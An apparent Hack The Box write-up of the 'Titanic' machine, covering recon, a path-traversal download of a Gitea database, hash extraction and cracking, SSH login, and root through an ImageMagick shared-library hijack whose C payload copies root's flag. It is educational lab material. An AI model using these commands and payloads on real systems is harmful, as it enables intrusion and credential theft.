# Titanic - Hack The Box Writeup

![Titanic HTB](https://labs.hackthebox.com/storage/avatars/eb5942ec56dd9b6feb06dcf8af8aefc6.png)




---

## Introduction

Titanic is a Hack The Box machine rated as Easy/Medium difficulty. This writeup covers the steps I took to enumerate, exploit, and gain root access on the machine. The challenge focuses on web vulnerabilities, SSH access, and privilege escalation.

---

## Enumeration

### Step 1: Nmap Scan 

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 03:13 CST
Nmap scan report for 10.129.193.215
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
This scan revealed several open ports, but the most relevant was port 80 running a web service, which indicated that a web application was available to explore. SSH might be used for later if there are credentials to access.

### Step 2: Web Enumeration

I opened the website on http://titanic.htb and interacted with the available pages. On the homepage, I found a "Book Your Trip" form. This form allowed users to input various details for booking a trip, which immediately caught my attention as a potential area for exploitation, particularly for Local File Inclusion (LFI) vulnerabilities. I tested for **LFI** by manipulating the form input fields using path traversal techniques in the “Book Your Trip” form. 
The idea behind this was to see if I could access sensitive files like the **passwd** file, which might reveal usernames on the system. I also tested for SQL injections and JSON in burp suite but had no luck.

### ffuf scan
```
ffuf -w /wordlists/subdomains-top1million-110000.txt -u http://titanic.htb/ -H  "Host:FUZZ.titanic.htb" -fc 301
```
I added this to my /etc/hosts file → dev.titanic.htb and visited the webpage.

The page had two repositories : developer / flask-app  and developer / docker-config. Below are a couple screen shots: 

![Screenshot 2025-02-19 124608](https://github.com/user-attachments/assets/f6616eea-f385-4b98-829a-f3296de66b68)
![Screenshot 2025-02-19 124517](https://github.com/user-attachments/assets/f1f42b8b-c10c-4138-b097-cafe23b6f74d)

### Step 3: LFI 
To exploit the LFI vulnerability, I modified the form's input to include path traversal sequences. This allowed me to access important files on the server, including the Gitea database (gitea.db) located at /data/gitea/gitea.db. I downloaded this file to further examine the user credentials:
```
curl --path-as-is http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db
```
### Step 4: Extracting the Gitea Database
Once I had the gitea.db file, I opened it with an SQLite client to explore the user credentials. I used the following command to retrieve the user information:
```
sqlite3 gitea.db "SELECT * FROM user;"
```
The result returned 2 users, including the administrator and developer accounts. Both users had PBKDF2-HMAC-SHA256 hashes for their passwords, which I would need to crack to progress further.
```
sqlite3 gitea.db "SELECT * FROM user;"
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
┌─[sg-dedivip-1]─[10.10.14.44]─[lotus17@htb-wi16vb5gka]─[~]
└──╼ [★]$ sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```
### Step 5: Cracking the Password Hashes
I saved the extracted hashes in a file named gitea.hashes and proceeded to crack them using hashcat. Since the hashes were in PBKDF2-HMAC-SHA256 format, I used the rockyou.txt wordlist:
```
hashcat -m 10900 gitea.hashes /usr/share/wordlists/rockyou.txt --force
```
While the cracking process was slow, I eventually managed to crack the password for the `developer` account, which was `25282528`.

### Step 6: Accessing Gitea as Developer
With the `developer` password in hand, I logged into ssh using the credentials i found. I used the following credentials:

- **Username:** developer
- **Password:** 25282528

This allowed me to access  find the user.txt, but I still needed to escalate my privileges to root.
```
developer@titanic:~$ ls
gitea  mysql  user.txt
developer@titanic:~$ cat user.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxx
```
### Step 7: Escalating Privileges / Root
I needed to check if there were any writeable directories that the developer user could access to gain access to files.  
The opt directories are usually a good place to look. < opt/apt/static/assets/images > /opt/app/tickets I took note of: 
```
developer@titanic:~$ find / -writable -type d 2>/dev/null


/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/dbus.socket
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/init.scope
/opt/app/static/assets/images
/opt/app/tickets
/home/developer
/home/developer/.ssh
/home/developer/gitea
/home/developer/gitea/data
/home/developer/gitea/data/git
/home/developer/gitea/data/git/.ssh
/home/developer/gitea/data/git/lfs
```

Inside the /opt/scripts directory I came across something interesting. There was a ‘identify_images.sh’ script here that i wasnt sure about so I input my findings to chatgpt.
```
developer@titanic:~$ cd /opt
developer@titanic:/opt$ ls
app  containerd  scripts
developer@titanic:/opt$ cd scripts/
developer@titanic:/opt/scripts$ ls
identify_images.sh
developer@titanic:/opt/scripts$ cat identify_images.sh 
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

![Screenshot 2025-02-19 122438](https://github.com/user-attachments/assets/e6c83bf6-d38f-435e-97f9-1bf760f84f81)

I then searched to see if there was a version of /usr/bin/magick i could follow:
```
developer@titanic:/opt/scripts$ /usr/bin/magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```
`Version: 7.1.1`

There was also a great github page explaing the Arbitrary Code Execution in `AppImage` version `ImageMagick`. I followed this:
-> https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

If I go into the directory that i found earlier  →  `opt/apt/static/assets/images`    and instead of using  `system("id");`  as in the github page, I modified the code to copy the root.txt into the currect directory using a simple cmd edit:
```
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /root/root.txt root.txt; chmod 754 root.txt");
    exit(0);
}
EOF
```
After executing and waiting a couple minutes, you can see that there is the root.txt file in the directory:
```
developer@titanic:/opt/app/static/assets/images$ ls -la
total 1288
drwxrwx--- 2 root developer   4096 Feb 19 02:34 .
drwxr-x--- 3 root developer   4096 Feb  7 10:37 ..
-rw-r----- 1 root developer 291864 Feb  3 17:13 entertainment.jpg
-rw-r----- 1 root developer 280854 Feb  3 17:13 exquisite-dining.jpg
-rw-r----- 1 root developer 209762 Feb  3 17:13 favicon.ico
-rw-r----- 1 root developer 232842 Feb  3 17:13 home.jpg
-rw-r----- 1 root developer 280817 Feb  3 17:13 luxury-cabins.jpg
-rw-r----- 1 root developer      0 Feb 19 02:34 metadata.log
-rwxr-xr-- 1 root root          33 Feb 19 02:34 root.txt
developer@titanic:/opt/app/static/assets/images$ cat root.txt
xxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Conclusion:
Titanic was a great box to test my skills on. It also showed me how valuable it was using online resources.
I hope this writeup was easy to follow! Thanks for reading! Happy Hacking :)!

